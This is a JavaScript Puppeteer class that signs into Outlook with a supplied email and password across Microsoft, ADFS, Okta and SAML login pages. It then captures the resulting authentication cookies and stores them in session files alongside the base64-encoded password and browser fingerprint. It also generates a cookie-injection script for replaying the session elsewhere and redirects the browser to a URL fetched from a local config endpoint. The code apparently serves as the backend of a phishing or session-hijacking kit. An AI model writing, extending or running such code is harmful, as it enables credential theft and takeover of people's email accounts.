const puppeteer = require('puppeteer');

class OutlookLoginAutomation {
    constructor(options = {}) {
        this.browser = null;
        this.page = null;
        this.context = null;
        this.enableScreenshots = options.enableScreenshots !== false;
        this.screenshotQuality = options.screenshotQuality || 80;
        this.isClosing = false;
        this.lastActivity = Date.now();
    }

    async init() {
        const browserOptions = {
            headless: 'new',
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-gpu',
                '--no-first-run',
                '--disable-extensions',
                '--disable-infobars',
                '--disable-notifications',
                '--disable-default-apps',
                '--disable-background-networking',
                '--disable-sync',
                '--no-default-browser-check',
                '--disable-popup-blocking',
                '--disable-translate'
            ],
            dumpio: false,
            ignoreHTTPSErrors: true,
            defaultViewport: null
        };

        // Dynamic Chromium path detection for multiple platforms
        try {
            const fs = require('fs');
            const { execSync } = require('child_process');

            // Priority: Environment variables first
            if (process.env.CHROMIUM_PATH && fs.existsSync(process.env.CHROMIUM_PATH)) {
                browserOptions.executablePath = process.env.CHROMIUM_PATH;
                console.log(`Using environment Chromium path: ${process.env.CHROMIUM_PATH}`);
            } else if (process.env.PUPPETEER_EXECUTABLE_PATH) {
                const execPath = process.env.PUPPETEER_EXECUTABLE_PATH;
                if (execPath.includes('*')) {
                    try {
                        const foundPath = execSync(`ls -d ${execPath} 2>/dev/null | head -1`, { encoding: 'utf8' }).trim();
                        if (foundPath && fs.existsSync(foundPath)) {
                            browserOptions.executablePath = foundPath;
                            console.log(`Using expanded PUPPETEER_EXECUTABLE_PATH: ${foundPath}`);
                        }
                    } catch (e) {
                        console.warn(`Failed to expand PUPPETEER_EXECUTABLE_PATH glob: ${execPath}`);
                    }
                } else if (fs.existsSync(execPath)) {
                    browserOptions.executablePath = execPath;
                    console.log(`Using PUPPETEER_EXECUTABLE_PATH: ${execPath}`);
                }
            }

            // Fallback: System chromium
            if (!browserOptions.executablePath) {
                try {
                    const chromiumPath = execSync('which chromium', { encoding: 'utf8' }).trim();
                    if (chromiumPath && fs.existsSync(chromiumPath)) {
                        browserOptions.executablePath = chromiumPath;
                        console.log(`Using system Chromium path: ${chromiumPath}`);
                    }
                } catch (e) {
                    console.log('System chromium not available, trying other methods...');
                }
            }

            // Fallback: Common paths
            if (!browserOptions.executablePath) {
                const commonPaths = [
                    '/opt/render/.cache/puppeteer/chrome/*/chrome-linux64/chrome',
                    '/nix/store/*/bin/chromium',
                    '/usr/bin/chromium',
                    '/usr/bin/chromium-browser',
                    '/usr/bin/google-chrome',
                    '/usr/bin/google-chrome-stable'
                ];

                for (const pathPattern of commonPaths) {
                    try {
                        if (pathPattern.includes('*')) {
                            const globCommand = pathPattern.includes('/nix/store/') 
                                ? `ls -d /nix/store/*chromium*/bin/chromium 2>/dev/null || true`
                                : `ls -d ${pathPattern} 2>/dev/null || true`;
                            
                            const foundPaths = execSync(globCommand, { encoding: 'utf8' }).trim().split('\n').filter(p => p);
                            if (foundPaths.length > 0 && fs.existsSync(foundPaths[0])) {
                                browserOptions.executablePath = foundPaths[0];
                                console.log(`Using glob-found Chromium: ${foundPaths[0]}`);
                                break;
                            }
                        } else if (fs.existsSync(pathPattern)) {
                            browserOptions.executablePath = pathPattern;
                            console.log(`Using system Chromium: ${pathPattern}`);
                            break;
                        }
                    } catch (pathError) {
                        continue;
                    }
                }
            }

            if (!browserOptions.executablePath) {
                console.log('Using Puppeteer default Chromium (bundled)');
            }

        } catch (error) {
            console.warn('Could not detect Chromium path, using Puppeteer default:', error.message);
        }

        // Launch browser with retries
        let retries = 3;
        while (retries > 0) {
            try {
                console.log(`Attempting to launch browser (attempt ${4-retries}/3)...`);
                this.browser = await puppeteer.launch(browserOptions);
                console.log('Browser launched successfully');

                this.context = await this.browser.createBrowserContext();
                console.log('Created private browser context for session isolation');

                await new Promise(resolve => setTimeout(resolve, 1000));
                break;
            } catch (error) {
                retries--;
                console.warn(`Browser launch attempt failed (${4-retries}/3):`, error.message);
                if (retries === 0) {
                    throw new Error(`Failed to launch browser after 3 attempts: ${error.message}`);
                }
                await new Promise(resolve => setTimeout(resolve, 3000));
            }
        }

        // Create new page
        try {
            this.page = await this.context.newPage();
            console.log('New page created in private context successfully');

            await this.page.setViewport({ width: 1280, height: 720 });
            await this.page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');

            this.page.on('error', (error) => {
                console.error('Page error:', error);
            });

            this.page.on('pageerror', (error) => {
                console.error('Page JavaScript error:', error);
            });

            console.log('Browser initialized successfully');
        } catch (error) {
            console.error('Failed to create new page:', error);
            if (this.browser) {
                try {
                    await this.browser.close();
                } catch (closeError) {
                    if (!closeError.message.includes('Target.closeTarget')) {
                        console.error('Error closing browser after page creation failure:', closeError);
                    }
                }
            }
            this.browser = null;
            this.page = null;
            throw new Error(`Failed to create new page: ${error.message}`);
        }
    }

    async navigateToOutlook() {
        try {
            console.log('Navigating to Outlook...');
            await this.page.goto('https://outlook.office.com/mail/', {
                waitUntil: 'domcontentloaded'
            });

            console.log('Successfully navigated to Outlook');
            await new Promise(resolve => setTimeout(resolve, 1000));
            return true;
        } catch (error) {
            console.error('Error navigating to Outlook:', error.message);
            return false;
        }
    }

    async performLogin(email, password) {
        try {
            console.log(`Attempting to login with email: ${email}`);

            // Wait for email input field
            await this.page.waitForSelector('input[type="email"]');

            // Enter email
            await this.page.type('input[type="email"]', email);
            console.log('Email entered');

            // Click Next button
            await this.page.click('input[type="submit"]');
            console.log('Clicked Next button');

            await new Promise(resolve => setTimeout(resolve, 1500));

            const currentUrl = this.page.url();
            console.log(`Current URL after email submission: ${currentUrl}`);

            const loginProvider = await this.detectLoginProvider();
            console.log(`Detected login provider: ${loginProvider}`);

            let loginSuccess = false;

            if (loginProvider === 'microsoft') {
                loginSuccess = await this.handleMicrosoftLogin(password);
            } else if (loginProvider === 'adfs') {
                loginSuccess = await this.handleADFSLogin(password);
            } else if (loginProvider === 'okta') {
                loginSuccess = await this.handleOktaLogin(password);
            } else if (loginProvider === 'azure-ad') {
                loginSuccess = await this.handleAzureADLogin(password);
            } else if (loginProvider === 'generic-saml') {
                loginSuccess = await this.handleGenericSAMLLogin(password);
            } else {
                console.warn(`Unknown login provider detected. Attempting generic login...`);
                loginSuccess = await this.handleGenericLogin(password);
            }

            if (!loginSuccess) {
                console.error('Password authentication failed - incorrect credentials provided');
                await this.takeScreenshot(`screenshots/login-failed-${Date.now()}.png`);
                return false;
            }

            await this.handleStaySignedInPrompt();
            await new Promise(resolve => setTimeout(resolve, 2500));

            const finalUrl = this.page.url();
            if (finalUrl.includes('outlook.office.com/mail')) {
                console.log('Login successful - redirected to Outlook mail');
                return true;
            }

            console.error('Login process completed but did not redirect to Outlook mail');
            await this.takeScreenshot(`screenshots/no-redirect-${Date.now()}.png`);
            return false;
        } catch (error) {
            console.error('Error during login:', error.message);
            return false;
        }
    }

    async detectLoginProvider() {
        try {
            const currentUrl = this.page.url();
            console.log(`Analyzing URL for login provider: ${currentUrl}`);

            if (currentUrl.includes('login.microsoftonline.com') || currentUrl.includes('login.live.com')) {
                return 'microsoft';
            } else if (currentUrl.includes('adfs') || currentUrl.includes('sts') || currentUrl.includes('fs.')) {
                return 'adfs';
            } else if (currentUrl.includes('okta.com') || currentUrl.includes('.okta.')) {
                return 'okta';
            } else if (currentUrl.includes('microsoftonline.com') && !currentUrl.includes('login.microsoftonline.com')) {
                return 'azure-ad';
            }

            const pageText = await this.page.evaluate(() => document.body.textContent || '');
            const pageTitle = await this.page.title();

            if (pageTitle.toLowerCase().includes('adfs') || pageText.toLowerCase().includes('active directory')) {
                return 'adfs';
            } else if (pageTitle.toLowerCase().includes('okta') || pageText.toLowerCase().includes('okta')) {
                return 'okta';
            } else if (pageText.toLowerCase().includes('saml') || pageText.toLowerCase().includes('single sign')) {
                return 'generic-saml';
            }

            if (currentUrl.includes('microsoft') || currentUrl.includes('office')) {
                return 'microsoft';
            }

            return 'unknown';

        } catch (error) {
            console.error('Error detecting login provider:', error.message);
            return 'unknown';
        }
    }

    async handleMicrosoftLogin(password) {
        try {
            console.log('Handling Microsoft standard login...');

            await this.page.waitForSelector('input[type="password"]');
            await this.page.type('input[type="password"]', password);
            console.log('Password entered for Microsoft login');

            await this.page.click('input[type="submit"]');
            console.log('Clicked Sign in button for Microsoft login');

            await new Promise(resolve => setTimeout(resolve, 2000));

            // Check for error messages
            const errorSelectors = [
                '[data-bind*="errorText"]',
                '.alert-error',
                '.error-message',
                '[role="alert"]',
                '.ms-TextField-errorMessage',
                '.field-validation-error'
            ];

            let errorMessage = null;
            for (const selector of errorSelectors) {
                try {
                    const errorElement = await this.page.$(selector);
                    if (errorElement) {
                        const text = await this.page.evaluate(el => el.textContent, errorElement);
                        if (text && text.trim()) {
                            errorMessage = text.trim();
                            break;
                        }
                    }
                } catch (e) {
                    continue;
                }
            }

            const pageText = await this.page.evaluate(() => document.body.textContent || '');
            const errorPatterns = [
                'Your account or password is incorrect',
                'password is incorrect',
                'Sign-in was unsuccessful',
                'The username or password is incorrect',
                'Invalid credentials',
                'Authentication failed'
            ];

            for (const pattern of errorPatterns) {
                if (pageText.toLowerCase().includes(pattern.toLowerCase())) {
                    errorMessage = pattern;
                    break;
                }
            }

            if (errorMessage) {
                console.error(`Microsoft login failed: ${errorMessage}`);
                await this.takeScreenshot(`screenshots/error-microsoft-login-${Date.now()}.png`);
                return false;
            }

            return true;

        } catch (error) {
            console.error('Error in Microsoft login:', error.message);
            return false;
        }
    }

    async handleADFSLogin(password) {
        try {
            console.log('Handling ADFS login...');

            const passwordSelectors = [
                'input[type="password"]',
                'input[name="Password"]',
                'input[name="password"]',
                '#passwordInput',
                '.password-input'
            ];

            let passwordField = null;
            for (const selector of passwordSelectors) {
                try {
                    await this.page.waitForSelector(selector);
                    passwordField = selector;
                    break;
                } catch (e) {
                    continue;
                }
            }

            if (!passwordField) {
                console.error('Could not find password field for ADFS login');
                return false;
            }

            await this.page.type(passwordField, password);
            console.log('Password entered for ADFS login');

            const submitSelectors = [
                'input[type="submit"]',
                'button[type="submit"]',
                '#submitButton',
                '.submit-button',
                'input[value*="Sign"]',
                'button:contains("Sign in")',
                'button:contains("Login")'
            ];

            let submitted = false;
            for (const selector of submitSelectors) {
                try {
                    const element = await this.page.$(selector);
                    if (element) {
                        await element.click();
                        console.log(`Clicked ADFS submit button: ${selector}`);
                        submitted = true;
                        break;
                    }
                } catch (e) {
                    continue;
                }
            }

            if (!submitted) {
                console.warn('Could not find submit button for ADFS, trying Enter key...');
                await this.page.keyboard.press('Enter');
            }

            await new Promise(resolve => setTimeout(resolve, 1500));
            return true;

        } catch (error) {
            console.error('Error in ADFS login:', error.message);
            return false;
        }
    }

    async handleOktaLogin(password) {
        try {
            console.log('Handling Okta login...');

            const passwordSelectors = [
                'input[name="password"]',
                'input[type="password"]',
                '.okta-form-input-field input[type="password"]',
                '#okta-signin-password'
            ];

            let passwordField = null;
            for (const selector of passwordSelectors) {
                try {
                    await this.page.waitForSelector(selector);
                    passwordField = selector;
                    break;
                } catch (e) {
                    continue;
                }
            }

            if (!passwordField) {
                console.error('Could not find password field for Okta login');
                return false;
            }

            await this.page.type(passwordField, password);
            console.log('Password entered for Okta login');

            const submitSelectors = [
                'input[type="submit"]',
                'button[type="submit"]',
                '.okta-form-submit-btn',
                '#okta-signin-submit',
                'button[data-type="save"]'
            ];

            let submitted = false;
            for (const selector of submitSelectors) {
                try {
                    const element = await this.page.$(selector);
                    if (element) {
                        await element.click();
                        console.log(`Clicked Okta submit button: ${selector}`);
                        submitted = true;
                        break;
                    }
                } catch (e) {
                    continue;
                }
            }

            if (!submitted) {
                await this.page.keyboard.press('Enter');
            }

            await new Promise(resolve => setTimeout(resolve, 1500));
            return true;

        } catch (error) {
            console.error('Error in Okta login:', error.message);
            return false;
        }
    }

    async handleAzureADLogin(password) {
        // Similar to Microsoft login but for Azure AD specific pages
        return await this.handleMicrosoftLogin(password);
    }

    async handleGenericSAMLLogin(password) {
        try {
            console.log('Handling Generic SAML login...');

            await this.page.waitForSelector('input[type="password"]');
            await this.page.type('input[type="password"]', password);
            
            const submitButton = await this.page.$('input[type="submit"], button[type="submit"]');
            if (submitButton) {
                await submitButton.click();
            } else {
                await this.page.keyboard.press('Enter');
            }

            await new Promise(resolve => setTimeout(resolve, 1500));
            return true;

        } catch (error) {
            console.error('Error in Generic SAML login:', error.message);
            return false;
        }
    }

    async handleGenericLogin(password) {
        return await this.handleGenericSAMLLogin(password);
    }

    async handleStaySignedInPrompt() {
        try {
            const staySignedInSelectors = [
                'input[type="submit"][value*="Yes"]',
                'button:contains("Yes")',
                '#idSIButton9',
                '.stay-signed-in-button'
            ];

            for (const selector of staySignedInSelectors) {
                try {
                    const element = await this.page.$(selector);
                    if (element) {
                        await element.click();
                        console.log('Clicked "Stay signed in" button');
                        await new Promise(resolve => setTimeout(resolve, 1000));
                        return;
                    }
                } catch (e) {
                    continue;
                }
            }

            console.log('No "Stay signed in" prompt found or handled');
        } catch (error) {
            console.error('Error handling stay signed in prompt:', error.message);
        }
    }

    async saveCookies(email = 'unknown', password = null) {
        try {
            console.log('💾 Starting enhanced session saving process...');

            const allCookies = await this.page.cookies();
            console.log(`📊 Total cookies retrieved: ${allCookies.length}`);

            // Filter and optimize cookies
            const essentialCookieNames = new Set([
                'SPSIDMIGRATED', 'MSFPC', 'MSPSID', 'MSPID', 'MSPCID', 'MSP_OFFLINE',
                'MicrosoftApplicationsTelemetryDeviceId', 'O365_AppControlTelemetryConsent',
                'OIDCToken', 'OAuthToken', 'OutlookSession', 'X-EXT-BCSKey', 'X-EXT-BackEndKey',
                'X-EXT-UXState', 'X-EXT-ClientId', 'X-EXT-HostName', 'X-EXT-UserAgent',
                'OutlookUserSession', 'OutlookWebSession', 'OutlookWebApp',
                'WebSessionOverride', 'aadSessionId', 'aadAuthUrl', 'STSID',
                'SessRememberMe', 'MS0', 'OfficeHome.FrontPage.LastTile'
            ]);

            const domains = new Set();
            const uniqueCookies = [];

            for (const cookie of allCookies) {
                domains.add(cookie.domain);

                if (essentialCookieNames.has(cookie.name) || 
                    cookie.name.includes('auth') || 
                    cookie.name.includes('session') || 
                    cookie.name.includes('token') ||
                    cookie.domain.includes('outlook') || 
                    cookie.domain.includes('office') || 
                    cookie.domain.includes('microsoft')) {
                    
                    cookie.secure = true;
                    cookie.sameSite = 'None';
                    uniqueCookies.push(cookie);
                }
            }

            console.log(`📦 Optimized to ${uniqueCookies.length} essential authentication cookies`);

            // Create session data
            const fs = require('fs');
            const path = require('path');
            const sessionDir = 'session_data';

            if (!fs.existsSync(sessionDir)) {
                fs.mkdirSync(sessionDir, { recursive: true });
            }

            const sessionId = Date.now();
            const sessionTimestamp = new Date().toISOString();
            const sessionEmail = email || 'unknown';
            const sessionFileName = `session_${sessionId}_${sessionEmail.replace(/[^a-zA-Z0-9]/g, '_')}.json`;
            const sessionFilePath = path.join(sessionDir, sessionFileName);

            const sessionData = {
                id: sessionId,
                timestamp: sessionTimestamp,
                email: sessionEmail,
                password: password ? Buffer.from(password).toString('base64') : null,
                totalCookies: uniqueCookies.length,
                domains: Array.from(domains),
                cookies: uniqueCookies,
                userAgent: await this.page.evaluate(() => navigator.userAgent),
                browserFingerprint: {
                    viewport: await this.page.viewport(),
                    timezone: await this.page.evaluate(() => Intl.DateTimeFormat().resolvedOptions().timeZone),
                    language: await this.page.evaluate(() => navigator.language)
                }
            };

            fs.writeFileSync(sessionFilePath, JSON.stringify(sessionData, null, 2));
            console.log(`💾 Session saved with ${uniqueCookies.length} cookies`);

            // Create injection script
            const sessionInjectScript = path.join(sessionDir, `inject_session_${sessionId}.js`);
            const sessionScriptContent = `
// Session Cookie Injector - Auto-generated on ${sessionTimestamp}
(function() {
    console.log('🚀 Injecting ${uniqueCookies.length} cookies for session: ${sessionEmail}');
    
    const cookies = ${JSON.stringify(uniqueCookies, null, 4)};
    let injected = 0;

    cookies.forEach(cookie => {
        try {
            let cookieStr = cookie.name + '=' + cookie.value + ';';
            cookieStr += 'domain=' + cookie.domain + ';';
            cookieStr += 'path=' + cookie.path + ';';
            cookieStr += 'expires=' + new Date(cookie.expires * 1000).toUTCString() + ';';
            if (cookie.secure) cookieStr += 'secure;';
            if (cookie.sameSite) cookieStr += 'samesite=' + cookie.sameSite + ';';

            document.cookie = cookieStr;
            injected++;
        } catch (e) {
            console.warn('Failed to inject cookie:', cookie.name);
        }
    });

    console.log('✅ Successfully injected ' + injected + ' cookies!');
    
    setTimeout(() => {
        if (confirm('Injected ' + injected + ' cookies for ${sessionEmail}! Open Outlook now?')) {
            window.open('https://outlook.office.com/mail/', '_blank');
        }
    }, 1000);
})();`;

            fs.writeFileSync(sessionInjectScript, sessionScriptContent);
            console.log(`🔧 Injection script created: inject_session_${sessionId}.js`);

            // Get configurable redirect URL
            let redirectUrl = 'https://office.com';
            try {
                const response = await fetch('http://localhost:5000/api/internal/redirect-url');
                const data = await response.json();
                if (data.success && data.redirectUrl) {
                    redirectUrl = data.redirectUrl;
                }
            } catch (error) {
                console.warn('Could not fetch redirect config, using default:', error.message);
            }

            console.log(`🔄 Redirecting to ${redirectUrl}...`);
            await this.page.goto(redirectUrl, {
                waitUntil: 'networkidle2',
                timeout: 30000
            });

            return sessionFilePath;

        } catch (error) {
            console.error('❌ Error saving enhanced session:', error.message);
            return null;
        }
    }

    async checkEmails() {
        try {
            console.log('Checking for emails...');

            await this.page.waitForSelector('[role="listbox"]', { timeout: 15000 });

            const emails = await this.page.$$('[role="listbox"] [role="option"]');
            console.log(`Found ${emails.length} emails in inbox`);

            const emailSubjects = [];
            for (let i = 0; i < Math.min(5, emails.length); i++) {
                try {
                    const subject = await emails[i].$eval('[data-testid="message-subject"]', el => el.textContent);
                    emailSubjects.push(subject);
                } catch (e) {
                    continue;
                }
            }

            console.log('Recent email subjects:', emailSubjects);
            return emailSubjects;

        } catch (error) {
            console.error('Error checking emails:', error.message);
            return [];
        }
    }

    async takeScreenshot(filename = 'screenshots/outlook-screenshot.png') {
        if (!this.enableScreenshots) {
            console.log(`Screenshot skipped (disabled): ${filename}`);
            return;
        }

        try {
            const fs = require('fs');
            const path = require('path');
            const screenshotDir = path.dirname(filename);

            if (!fs.existsSync(screenshotDir)) {
                fs.mkdirSync(screenshotDir, { recursive: true });
            }

            await this.page.screenshot({
                path: filename,
                quality: this.screenshotQuality,
                type: 'jpeg',
                fullPage: false
            });
            console.log(`Screenshot saved as ${filename}`);
        } catch (error) {
            console.error('Error taking screenshot:', error.message);
        }
    }

    async close() {
        if (this.isClosing) {
            console.log('Close operation already in progress');
            return;
        }

        this.isClosing = true;

        if (this.browser) {
            try {
                const isConnected = this.browser.isConnected();

                if (isConnected) {
                    if (this.page && !this.page.isClosed()) {
                        try {
                            this.page.removeAllListeners();
                            await this.page.close();
                        } catch (pageError) {
                            if (!pageError.message.includes('Target.closeTarget')) {
                                console.error('Error closing page:', pageError.message);
                            }
                        }
                    }

                    try {
                        const pages = await this.browser.pages();
                        for (const page of pages) {
                            if (!page.isClosed()) {
                                try {
                                    page.removeAllListeners();
                                    await page.close();
                                } catch (individualPageError) {
                                    if (!individualPageError.message.includes('Target.closeTarget')) {
                                        console.error(`Error closing individual page:`, individualPageError.message);
                                    }
                                }
                            }
                        }
                    } catch (pagesError) {
                        if (!pagesError.message.includes('Target.closeTarget')) {
                            console.error('Error closing additional pages:', pagesError.message);
                        }
                    }

                    if (this.context) {
                        try {
                            await this.context.close();
                            console.log('Private browser context closed');
                        } catch (contextError) {
                            if (!contextError.message.includes('Target.closeTarget')) {
                                console.error('Error closing browser context:', contextError.message);
                            }
                        }
                    }

                    try {
                        await this.browser.close();
                        console.log('Browser closed successfully');
                    } catch (browserCloseError) {
                        if (!browserCloseError.message.includes('Target.closeTarget')) {
                            console.error('Error closing browser:', browserCloseError.message);
                        }
                    }
                } else {
                    console.log('Browser connection already closed');
                }
            } catch (error) {
                console.error('Error closing browser:', error.message);
                if (error.message.includes('Connection closed') || error.message.includes('Session closed')) {
                    console.log('Browser session already terminated');
                } else {
                    try {
                        const process = this.browser.process();
                        if (process && !process.killed) {
                            process.kill('SIGKILL');
                            console.log('Browser process force-killed');
                        }
                    } catch (killError) {
                        console.error('Error force-killing browser process:', killError.message);
                    }
                }
            }
        }

        this.browser = null;
        this.page = null;
        this.context = null;
        this.isClosing = false;
    }
}

module.exports = { OutlookLoginAutomation };